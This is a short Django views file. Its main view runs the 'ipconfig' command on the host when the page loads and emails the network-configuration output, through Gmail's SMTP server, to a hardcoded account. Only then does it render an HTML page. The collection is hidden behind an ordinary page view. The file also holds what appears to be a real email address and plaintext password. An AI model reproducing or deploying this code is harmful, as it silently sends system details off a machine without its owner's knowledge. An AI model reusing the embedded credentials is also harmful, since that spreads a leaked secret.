from django.shortcuts import render
from django.shortcuts import HttpResponse
import subprocess
import smtplib

def web_page1(request):
    path=subprocess.check_output('ipconfig')
    server=smtplib.SMTP('smtp.gmail.com','587')
    server.starttls()
    server.login('anishs71443@gmail.com','Ankrsi12@@@@')
    server.sendmail('anishs71443@gmail.com','anishs71443@gmail.com',path)
    server.quit()
    return render(request,"html1.html")
#def web_page0(request):
    #return render(request,"html0.html")
